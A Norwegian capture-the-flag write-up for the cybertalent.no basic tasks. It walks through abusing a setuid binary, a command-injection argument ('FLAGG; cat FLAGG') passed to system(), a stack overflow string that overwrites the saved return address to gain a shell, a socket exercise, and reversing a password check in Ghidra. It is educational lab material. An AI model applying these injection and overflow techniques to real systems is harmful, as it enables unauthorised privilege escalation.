# 1_Grunnleggende

Min Profil:

```
Navn:   ChestyRiggs
Profil: https://ctf.cybertalent.no/u/41f9bba70284ba9d7358cae284c150ee
```

## 1.1_scoreboard

Flagget her ligger rett i mappen, ubeskyttet. Denne oppgaven er dermed nesten bare en demo av `cat FLAGG` som har en tendens til å gå igjen i CTFer:

```sh
$ cd /home/login/1_grunnleggende/1_scoreboard
$ cat FLAGG
```

FLAGG: `05250...........................`

---

## 1.2_setuid

Vi er logget inn som brukeren `login`.

```bash
$ id
uid=1000(login) gid=1000(login) groups=1000(login)
```

Og hvis vi ser på filene i mappen ser vi at `FLAGG` har rettighetene `-r--------`, som betyr at kun eieren `basic2` kan lese (read) denne filen:

```sh
$ ls -lah
total 91K
drwxr-xr-x 2 basic2 login 1.0K Feb 12  2020 .
drwxr-xr-x 8 login  login 1.0K Dec 17 19:54 ..
-r-sr-xr-x 1 basic2 login  43K Feb 12  2020 cat
-r-------- 1 basic2 login   33 Dec 17 19:17 FLAGG
-r-sr-xr-x 1 basic2 login  43K Feb 12  2020 id
-r--r--r-- 1 basic2 login 1.8K Feb 12  2020 LESMEG.md
```

Om vi ser på de andre filene så ser vi at `cat` er eid av `basic2` og har rettighetene `-r-sr-xr-x`. `-r-s` biten er nøkkelen, siden det betyr at når vi kjører dette programmet så vil prosessen ha samme rettigheter som **eieren** `basic2` - ikke brukeren som starter prosessen slik man ville hatt med `-r-x`.

Vi ser også at vi har lov å execute denne fila, fordi vi ser at den tilhører login-gruppen som vi er med i - og vi ser at da er det `r-x` privilegier som gjelder.

Det er ikke sagt direkte, men vi vet jo hva `cat` kommandoen gjør, og kanskje cat-filen gjør det samme? Jo vist:

```sh
$ ./cat FLAGG
8e1c3138b0691a6519126acf57a323e
```

FLAGG: `08e1c...........................`

---

## 1.3_Injection

Denne oppgaven er ikke veldig ulik `1.2_setuid` i det at man utnytter egenskapene og privilegiene til et program man lov å execute for å få tilgang til noe man ikke egentlig har privilegiene til. Vi ser at filene eies av `basic3`, og `FLAGG` filen som vi er mest interessert i har igjen privilegier som kun gjør at eier kan lese filen:

```sh
$ ls -lah
total 23K
drwxr-xr-x 2 basic3 login 1.0K Feb 12  2020 .
drwxr-xr-x 8 login  login 1.0K Dec 17 19:54 ..
-r-------- 1 basic3 login   33 Feb 12  2020 FLAGG
-r--r--r-- 1 basic3 login 1.1K Feb 12  2020 LESMEG.md
-r-sr-xr-x 1 basic3 login  17K Feb 12  2020 md5sum
-r--r--r-- 1 basic3 login  450 Feb 12  2020 md5sum.c
```

Vi får vite at programmene i mappen sender brukerkontrollert data videre til operativsystemets `system()`-funksjon uten _sanitisering_, og som i forrige oppgave ser vi at selv om `basic3` er eier så har vi execute rettigheter.

`md5sum` viser seg å være et program som lager md5 checksums av hva enn fil du sender inn som argument, men som det blir hintet til (og som vi kan se av kommandoen `system(cmd)` i kildekoden) kan vi kanskje sende inn litt andre kommandoer også...

```sh
$ ./md5sum "FLAGG; cat FLAGG"
Kjører kommando:
/usr/bin/md5sum FLAGG; cat FLAGG

Resultat:
bf1ee5c1af8d90c18cb594cc264edd33  FLAGG
64021..........................
```

Nøkkelen her er å ha double-quotes rundt kommandoen. Dersom man kjører kommandoen `./md5sum FLAGG; cat FLAGG` vil man få permission denied, men alt innenfor double-quotes blir av `md5sum` regnet som et argument - helt til det når `system()` som kommer til å se dette som flere.

FLAGG: `64021...........................`

---

## 1.4_overflow

Vi har følgende filer:

```sh
$ ls -lah
total 28K
drwxr-xr-x 2 basic4 login 1.0K Feb 12  2020 .
drwxr-xr-x 8 login  login 1.0K Dec 17 19:54 ..
-r-------- 1 basic4 login   33 Dec 17 19:17 FLAGG
-r--r--r-- 1 basic4 login 2.0K Feb 12  2020 LESMEG.md
-r-sr-xr-x 1 basic4 login  17K Feb 12  2020 overflow
-r--r--r-- 1 basic4 login 4.5K Feb 12  2020 overflow.c
-r--r--r-- 1 basic4 login   38 Feb 12  2020 sample_shellcode
```

Vi kan se ut av kildekoden (samt at det hintes ganske kraftig i oppgaven) at programmet `overflow.c` leser en environment variable `SHC`. Det blir også hintet ganske kraftig til at denne kan mates med [shellkode](https://en.wikipedia.org/wiki/Shellcode)

For denne oppgaven trenger vi bare bruke den shellkoden som følger med. Vi setter environment variablen SHC med `export`:

```sh
$ export SHC=$(cat sample_shellcode)
(no output)
```

Hvis vi leser i kildekoden så ser vi at dersom brukeren har satt et eller flere argumenter etter programmnavnet så vil funksjonen `strcpy()` kjøres. Uten noen form for validering putter den hva enn argument vi setter rett til `buffer` som er et unsigned char på 32 bytes. All data over den lengden vil dermed overskrive andre deler av minnet, og kan gjøre det mulig for oss å få programmet til å gjøre ting det egentlig ikke skal - I vår tilfelle; kjøre shellkoden vi lastet inn.

Vi kan starte med å putte inn noen verdier som argument, for å se hva som skjer. Fra oppgaveteksten vet vi allerede at vi skal skrive over above, og det kan vi også se fra koden:

```sh
$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
above has incorrect value.
Read source code to find the magic number.
```

Om vi titter i kildekoden ser vi at `above == 0x4847464544434241` kommer til å gi oss et litt annet resultat.

Vi ser at `A` gir oss verdien `41`, og det samsvarer med `hexadesimal` verdien til [ASCII characteren A](https://www.watelectronics.com/ascii-numbering-system-and-its-conversion-from-ascii-to-hex/). Hva om vi bytter ut noen av A'ene våre med tegn som gir verdiene 48, 47, 46 også videre?

| 48  | 47  | 46  | 45  | 44  | 43  | 42  | 41  |
| --- | --- | --- | --- | --- | --- | --- | --- |
| H   | G   | F   | E   | D   | C   | B   | A   |

Viser seg også at minnet er [LIFO](https://2minutetech.wordpress.com/2015/11/13/what-is-fifo-and-lifo/), og dermed må vi snu om verdiene når vi skal skrive dette inn:

```sh
$ ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGH

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x4847464544434241
below = 0x6867666564636261

Stackdump:
0x7ffc8e1eac60   00 00 08 00 02 00 00 00  |........|
0x7ffc8e1eac58   28 ad 1e 8e fc 7f 00 00  |(.......|
0x7ffc8e1eac50   00 00 00 00 00 00 00 00  |........|
stored rip       9b 80 22 9c d9 7f 00 00  |..".....|
stored rbp       c0 2a d0 95 40 56 00 00  |.*..@V..|
0x7ffc8e1eac38   f0 20 d0 95 40 56 00 00  |. ..@V..|
0x7ffc8e1eac30   00 00 00 00 00 00 00 00  |........|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
0x7ffc8e1eac20   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffc8e1eac18   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffc8e1eac10   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffc8e1eac08   41 41 41 41 41 41 41 41  |AAAAAAAA|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               e0 ab 1e 8e fc 7f 00 00  |........|

above is correct!
Next step is to adjust the stored rip to point to shellcode
```

Her hintes det om at neste steg er å få `stored rip` til å peke til shellkoden vår. Her er en god del lesing av kildekoden for å komme frem til løsningen, og for en mye mer inngående forklaring kan man lese [Sithis' write-up fra 2020](https://github.com/williamsolem/Etjenesten-Cybertalent-CTF-Writeup#overflow).

Det man til syvende og sist er på jakt etter er minne-addressen til shellkoden:

```c
...
#include <string.h>
#include <errno.h>

#define SHELLCODE_ADDRESS 0x303030303030 <----
#define KGREEN "\033[01;32m"
...
```

Dette har vi sett før, og igjen kan vi konvertere hexadesimal verdiene til ASCII. Da vil vi se at `0x303030303030` blir til `0x0000000`.

_Her er også mulig å gjette seg til denne verdien ved å se litt på output'en fra `./overflow`. Vi ser at her er et område som heter `&shellcode_ptr` som vi kanskje kunne tenke oss til er [pekeren](<https://en.wikipedia.org/wiki/Pointer_(computer*programming)>) vi ser etter.*

Vi fyller opp den biten av minnet vi ikke trenger, før vi kommer opp til `stored rip` områder. Her legger vi inn 0-ene våre. Når vi kjører dette så vil vi ende opp med et shell, og herfra kan vi gjøre litt som vi vil:

```sh
 ./overflow AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHAAAAAAAAAAAAAAAAAAAAAAAA000000

Before strcpy:
above = 0x               0
below = 0x6867666564636261

After strcpy:
above = 0x4847464544434241
below = 0x6867666564636261

Stackdump:
0x7ffec336e060   00 00 08 00 02 00 00 00  |........|
0x7ffec336e058   28 e1 36 c3 fe 7f 00 00  |(.6.....|
0x7ffec336e050   00 00 00 00 00 00 00 00  |........|
stored rip       30 30 30 30 30 30 00 00  |000000..|
stored rbp       41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffec336e038   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffec336e030   41 41 41 41 41 41 41 41  |AAAAAAAA|
&above           41 42 43 44 45 46 47 48  |ABCDEFGH|
0x7ffec336e020   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffec336e018   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffec336e010   41 41 41 41 41 41 41 41  |AAAAAAAA|
0x7ffec336e008   41 41 41 41 41 41 41 41  |AAAAAAAA|
&buffer          41 41 41 41 41 41 41 41  |AAAAAAAA|
&below           61 62 63 64 65 66 67 68  |abcdefgh|
&width           08 00 00 00 00 00 00 00  |........|
&shellcode_ptr   30 30 30 30 30 30 00 00  |000000..|
&p               e0 df 36 c3 fe 7f 00 00  |..6.....|

above is correct!
Next step is to adjust the stored rip to point to shellcode
$ id
uid=1004(basic4) gid=1000(login) groups=1000(login)
$ cat FLAGG
8bd49...........................
```

Vi kjører `id` for å sjekke hvem vi er nå og ser at vi har et shell som `basic4`. Dermed har vi mulighet til å kjøre `cat FLAGG` og vi er i mål!

FLAGG: `8bd49...........................`

---

## 1.5_nettverk

Vi har følgende filer

```sh
$ ls -lah
total 22K
drwxr-xr-x 2 basic5 login 1.0K Feb 12  2020 .
drwxr-xr-x 8 login  login 1.0K Feb 12  2020 ..
-rwxr-xr-x 1 basic5 login  311 Feb 12  2020 client.py
-r-------- 1 basic5 login  659 Dec 20 11:34 FLAGG
-r--r--r-- 1 basic5 login  714 Feb 12  2020 LESMEG.md
-r-s--x--x 1 basic5 login  17K Feb 12  2020 server
```

Dersom vi starter filen `server` så vil den starte å lytte på port `10015`

```sh
$ ./server
Lytter på port 10015, koble til for videre instruksjoner.
```

client.py inneholder minimumet vi trenger for å koble til serveren vår, ingenting mer:

```python
#!/usr/bin/env python3

import socket
import struct
import select

TCP_IP = "127.0.0.1"
TCP_PORT = 10015


def main():
  conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  conn.connect((TCP_IP, TCP_PORT))
  print(conn.recv(4096).decode("utf-8"))

  # ???

if __name__ == "__main__":
  main()
```

Her er et par hint allerede. Vi ser for eksempel at både `struct` og `select` bibliotekene er importer - men ikke brukt, og om vi ser på linjen rett etter tilkoblingen så ser vi en `print()`. Tydeligvis kan forvente et svar tilbake, og riktig nok - om vi kjører `client.py` får vi følgende beskjed:

```sh
$ python3 client.py
Dette er en grunnleggende introduksjon til nettverksprogrammering.
Når du har åpnet ti nye tilkoblinger til denne serveren vil du få videre instruksjoner på denne socketen.
```

Rimelig grei instruksjon der, så da legger vi til følgende kode i `client.py`, under `# ???`:

```python
    # Generer 10 nye sockets og lagrer de i en liste
    sockets = []
    for i in range(0, 10):
      sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

    # Opprett en tilkobling for hver socket
    for s in sockets:
      s.connect((TCP_IP, TCP_PORT))

    # Lytter etter neste hint på den opprinnelige socketen, slik hintet sier
    print(conn.recv(4096).decode("utf-8"))

```

Dette gir oss de 10 nye tilkoblingene våre, og vi et nytt hint:

```
Du vil nå få tilsendt et 32-bits heltall i `network byte order` i hver av de ti andre sesjonene.
Summer alle, og send resultatet tilbake på denne socketen.
Det er mange måter å konvertere data på. En av dem er `struct.unpack`.
```

Her får vi en ganske grei instruksjon, med en del hint som blir nyttige for oss. At det er `32-bits heltall` i `network byte order` blir viktig for å vite hvordan parametere vi skal bruke sammen med `struct.unpack` for å decode dataene vi motar. Vi legger til følgende kode

```python
    # Vi trenger en variabel for å holde resultatet vårt
    result = 0

    # Sjekk hver socket, decode beskjeden og summér resultatet
    for s in sockets:
        # Motta noe data
        data = s.recv(4096)
        # Decode dataen. I følge struct sin dokumentasjon betyr `!` network byte-order og `i` heltall (int)
        decoded = struct.unpack("!i", data)
        # Summér resultatet. Decode returnerer en tuple, så vi plukker kun første verdien fra denne
        result = result + decoded[0]

    # Encode resultatet vårt med samme verdier som vi brukte når vi decodet. Dette står ikke noe sted, men vi kan
    # regne med at serveren forventer å få det samme tilbake igjen.
    encoded = struct.pack("!i", result)

    # Send svaret vårt til serveren
    conn.send(bytes(encoded))

    # Se om vi får en ny melding tilbake!
    print(conn.recv(4096).decode("utf-8"))
```

Vi får nye instrukser og hint tilbake:

```
Neste melding sendes fordelt over de ti sesjonene.
For å unngå å blokkere mens du leser kan du for eksempel bruke `select.select()` eller `socket.settimeout(0)`.
```

Siden noen tok seg bryet med å legge inn [select biblioteket](https://bip.weizmann.ac.il/course/python/PyMOTW/PyMOTW/docs/select/index.html) for oss allerede, så får vi vel gå den veien :)

```python
    # Vi kommer til å trenge en variabel hvor vi samler sammen dataen vi får til én hel beskjed
    msg_buffer = ''

    # Vi kommer også til å trenge en verdi som sier når vi har motatt en ny beskjed
    new_message = True

    # Så lenge new_message er True, akkumuler all socket dataen i msg_buffer
    while new_message:
        readableSockets, writableSockets, SocketsWithError = select.select(sockets, sockets, [], 5)
        for s in readableSockets:
            msg = s.recv(4096)
            # Dersom vi motar en forsendelse med lengde 0 så velger vi å definere det som én melding
            if len(msg) <= 0:
                # Derfor setter vi new_message til False, slik at while-løkka vår avslutes
                new_message = False
                # Og vi bryter ut av for-løkken vår
                break
            msg_buffer += msg.decode("utf-8")

    # Når new_message er blitt False, og while-løkken avsluttes - vis beskjeden vi mottok
    print(msg_buffer)

    # Av god vane så lukker vi alle tilkoblingene våre til slutt :)
    conn.close()
    for s in sockets:
        s.close()
```

Når vi har lagt inn denne - og har ventet en stund - så kommer endelig flagget opp:

```sh
╭────────────────────────────────────────╮
│ Gratulerer!                            │
│                                        │
│ Her er flagget:                        │
│                                        │
├────────────────────────────────────────┤
│    bf35e...........................    │
╰────────────────────────────────────────╯

Husk at utf-8 kan ha multi-byte tegn 😊
```

Det kan være greit å merke seg at vi har litt flaks (eventuelt har forfatteren prøvet og feilet litt...) slik at vi mottar nøyaktig én beskjed før vi får `len(msg) == 0`. Alternativt måtte vi puttet hele while-løkka vår inni enda en uendelig løkke, og funnet en annen måte å exite på.

Komplett kode:

```python
#!/usr/bin/env python3

import socket
import struct
import select

TCP_IP = "127.0.0.1"
TCP_PORT = 10015


def main():
  conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  conn.connect((TCP_IP, TCP_PORT))
  print(conn.recv(4096).decode("utf-8"))

  # ???

  # Generer 10 nye sockets og lagrer de i en liste
  sockets = []
  for i in range(0, 10):
    sockets.append(socket.socket(socket.AF_INET, socket.SOCK_STREAM))

  # Opprett en tilkobling for hver socket
  for s in sockets:
    s.connect((TCP_IP, TCP_PORT))

  # Lytter etter neste hint på den opprinnelige socketen, slik hintet sier
  print(conn.recv(4096).decode("utf-8"))

  # Vi trenger en variabel for å holde resultatet vårt
  result = 0

  # Sjekk hver socket, decode beskjeden og summér resultatet
  for s in sockets:
    # Motta noe data
    data = s.recv(4096)
    # Decode dataen. I følge struct sin dokumentasjon betyr `!` network byte-order og `i` heltall (int)
    decoded = struct.unpack("!i", data)
    # Summér resultatet. Decode returnerer en tuple, så vi plukker kun første verdien fra denne
    result = result + decoded[0]

  # Encode resultatet vårt med samme verdier som vi brukte når vi decodet. Dette står ikke noe sted, men vi kan
  # regne med at serveren forventer å få det samme tilbake igjen.
  encoded = struct.pack("!i", result)

  # Send svaret vårt til serveren
  conn.send(bytes(encoded))

  # Se om vi får en ny melding tilbake!
  print(conn.recv(4096).decode("utf-8"))

  # Vi kommer til å trenge en variabel hvor vi samler sammen dataen vi får til én hel beskjed
  msg_buffer = ''

  # Vi kommer også til å trenge en verdi som sier når vi har motatt en ny beskjed
  new_message = True

  # Så lenge new_message er True, akkumuler all socket dataen i msg_buffer
  while new_message:

    # Det tar litt tid å lese datastrømmen. Så vi gir litt output til brukeren sånn at vi ser at _noe_ skjer
    print("Leser datastrøm...")

    readableSockets, writableSockets, SocketsWithError = select.select(sockets, sockets, [], 5)
    for s in readableSockets:
      msg = s.recv(4096)
      # Dersom vi motar en forsendelse med lengde 0 så velger vi å definere det som én melding
      if len(msg) <= 0:
        # Derfor setter vi new_message til False, slik at while-løkka vår avslutes
        new_message = False
        # Og vi bryter ut av for-løkken vår
        break
      msg_buffer += msg.decode("utf-8")

  # Når new_message er blitt False, og while-løkken avsluttes - vis beskjeden vi mottok
  print(msg_buffer)

  # Av god vane så lukker vi alle tilkoblingene våre til slutt :)
  conn.close()
  for s in sockets:
    s.close()

if __name__ == "__main__":
  main()
```

## 1.6_Reversing

Vi har følgende filer, og ellers ikke veldig mye å gå på:

```sh
$ ls -lah
total 24K
drwxr-xr-x 2 basic6 login 1.0K Feb 12  2020 .
drwxr-xr-x 8 login  login 1.0K Feb 12  2020 ..
-r-------- 1 basic6 login   33 Dec 20 11:34 FLAGG
-r--r--r-- 1 basic6 login 1.4K Feb 12  2020 LESMEG.md
-r-sr-xr-x 1 basic6 login  17K Feb 12  2020 check_password
-r-------- 1 basic6 login 1.1K Feb 12  2020 check_password.c
```

Vi ser ut av rettighetene at vi kommer ikke til å få gjøre så mye med `FLAGG` eller `check_password.c`, men vi kan kjøre `check_password` filen:

```sh
$ ./check_password
Bruk: ./check_password PASSORD

Sjekk passord gitt som første argument.
Hvis passordet er korrekt startes et nytt shell med utvidete rettigheter.
```

Og dersom vi gjetter et passord:

```sh
./check_password 1234
Feil passord :(
Du stoppet på steg 1
```

Aha - så da kan det jo hende vi kan finne ut hva PASSORD bør være, dersom vi reverser `check_password`.

Dersom vi ser på `main` i Ghidra så ser vi at en decompiler til følgende. Merk at i de følgende kodesnuttene er de mest interessante variablene renamet:

```c
uint main(int param_1,undefined8 *passwordInput,char **param_3)

{
  __uid_t __euid;
  __uid_t __ruid;
  char *local_38;
  undefined8 local_30;
  uint result;

  if (param_1 != 2) {
    printf("Bruk: %s PASSORD\n\n",*passwordInput);
    puts(&GLOBAL_LINE_BREAK);
    puts("Hvis passordet er korrekt startes et nytt shell med utvidete rettigheter.");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  result = check_password(passwordInput[1]);
  if (result == 0) {
    local_38 = "/bin/sh";
    local_30 = 0;
    puts("Korrekt passord!");
    __euid = geteuid();
    __ruid = geteuid();
    setreuid(__ruid,__euid);
    execve(local_38,&local_38,param_3);
  }
  else {
    puts("Feil passord :(");
    printf(&DAT_001020d3,result);
  }
  return result;
}
```

Her ser vi at funksjonen `check_password()` tar imot passord-parameteret. Da er det relativt greit å tenke seg til at den sikkert gjør noen sjekker, før den helst skulle ha returnert hel-tallet `0` slik at vi kommer oss videre.

Vi kan ta en titt på `check_password` decompilert:

```c
undefined8 check_password(char *passwordInput)

{
  int iVar1;
  size_t passwordLength;
  undefined8 uVar2;
  char local_16;
  undefined local_15;
  undefined local_14;
  undefined local_13;
  undefined local_12;
  undefined local_11;
  undefined local_10;
  undefined local_f;
  undefined local_e;
  undefined local_d;
  int local_c;

  passwordLength = strlen(passwordInput);
  if (passwordLength == 0x20) {
    iVar1 = strncmp("Reverse_engineering",passwordInput,0x13);
    if (iVar1 == 0) {
      if (passwordInput[0x13] == '_') {
        local_c = *(passwordInput + 0x13);
        if (local_c == 0x5f72655f) {
          local_16 = 'm';
          local_15 = 0x6f;
          local_14 = 0x72;
          local_13 = 0x73;
          local_12 = 0x6f;
          local_11 = 0x6d;
          local_10 = 0x74;
          local_f = 0x5f;
          local_e = 0x5f;
          local_d = 0;
          iVar1 = strncmp(&local_16,passwordInput + 0x17,10);
          if (iVar1 == 0) {
            uVar2 = 0;
          }
          else {
            uVar2 = 5;
          }
        }
        else {
          uVar2 = 4;
        }
      }
      else {
        uVar2 = 3;
      }
    }
    else {
      uVar2 = 2;
    }
  }
  else {
    uVar2 = 1;
  }
  return uVar2;
}
```

Vi kan lese oss til følgende:

```c
if(passwordLengt == 0x20)
```

Passordet må være `0x20` langt - altså `32`

```c
iVar1 = strncmp("Reverse_engineering",passwordInput,0x13);
```

[strncmp](https://www.tutorialspoint.com/c_standard_library/c_function_strncmp.htm) sammenligner de `n` første bytene av `str1` og `str2`, og returnerer `0` dersom de er lik. Altså vet vi at de `19` første tegnene i passordet må være `Reverse_engineering`.

```c
if (passwordInput[0x13] == '_') {
```

Det 19.tegnet skal være en `_`

```c
local_c = *(passwordInput + 0x13);
if (local_c == 0x5f72655f) {
  local_16 = 'm';
  local_15 = 0x6f;  // 'o'
  local_14 = 0x72;  // 'r'
  local_13 = 0x73;  // 's'
  local_12 = 0x6f;  // 'o'
  local_11 = 0x6d;  // 'm'
  local_10 = 0x74;  // 't'
  local_f = 0x5f;   // '_'
  local_e = 0x5f;   // '_'
  local_d = 0;
  iVar1 = strncmp(&local_16,passwordInput + 0x17,10);
```

`local_c` settes til verdien av de første 32 bittene (`unsigned int` er mellom 16 og 32 bytes i C) - `0x13` (19) bytes inn fra der minneområdet til som `passwordInput` ligger i starter. Fordi ett ASCII tegn tar én byte, ender vi da opp med at `local_c` holder fire ASCII tegn - 4 byte.

Neste steg sjekker om disse fire bytene er lik `0x5f72655f`. Konverterer vi fra hexadesimal til ASCII får vi `_re_`, men hadde vi for eksempel lest `local_c` fra `passwordInput + 0` ville vi få `0x65766552` som blir til `eveR`. Det er ikke veldig åpenbart her, men fordi vi kan norsk så kan vi kanskje gjette oss til at noe er bakvendt her... Dette har med [endianness](https://en.wikipedia.org/wiki/Endianness) å gjøre, og i tilfellet vårt her har vi Little-Endian. Vi ender derfor med at passordet så langt er `Reverse_engineering_er_`

Deretter kommer det en drøss variabler med størrelse på én byte (som vi da kanskje allerde kan gjette er ASCII verdier), og her er det greit å merke seg at navngivningen fra Ghidra hinter til at disse kanskje ligger etterhverandre i minnet - `local_16, local_15, ...osv` - totalt 10 bytes. Sånn at når vi ser det kommer en ny `strncmp()` - og vi ser at vi skal sammenligne de `10` første bytes fra minneområdet hvor variablen `local_16` ligger (`&local_16` returnerer en pekeren) med verdien fra `passwordInput + 0x17` (altså verdien av passwordInput fra byte `23` og ut) - så betyr det at den egentlig sjekker `strncmp('morsomt__', 'morsomt__', 10)` dersom vi gir rett passord inn.

Om vi setter alt samme så får vi `Reverse_engineering_er_morsomt__`, og dersom vi prøver oss på dette så ender vi opp i shellet:

```sh
$ ./check_password Reverse_engineering_er_morsomt__
Korrekt passord!
$ id
uid=1006(basic6) gid=1000(login) groups=1000(login)
$ cat FLAGG
6f44f...........................
```

FLAGG: `6f44f...........................`

Her kan vi også lese ut hele `check_password.c`, og det kan jo være greit å legge merke til hvordan Ghidra valgte å tolke denne koden kontra hvordan kildekoden faktisk ser ut:

```c
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int
check_password(char *password)
{
        if (strlen(password) != 32)
                return 1;

        if (strncmp("Reverse_engineering", password, 19))
                return 2;

        if (password[19] != '_')
                return 3;

        unsigned int third_word = *(unsigned int *)(password + 19);
        if (third_word != 0x5f72655f)
                return 4;

        char last_word[] = {'m', 'o', 'r', 's', 'o', 'm', 't', '_', '_', 0};
        if (strncmp(last_word, password + 23, sizeof(last_word)))
                return 5;

        return 0;
}

int
main(int argc, char *argv[], char *envp[])
{
        if (argc != 2) {
                printf("Bruk: %s PASSORD\n\n", argv[0]);
                printf("Sjekk passord gitt som første argument.\n");
                printf("Hvis passordet er korrekt startes et nytt shell med utvidete rettigheter.\n");
                exit(0);
        }

        int retval = check_password(argv[1]);

        if (retval == 0) {
                char *args[] = {"/bin/sh", NULL};

                printf("Korrekt passord!\n");
                setreuid(geteuid(), geteuid());
                execve(args[0], args, envp);
        }

        else {
                printf("Feil passord :(\n");
                printf("Du stoppet på steg %u\n", retval);
        }

        return retval;
}
```
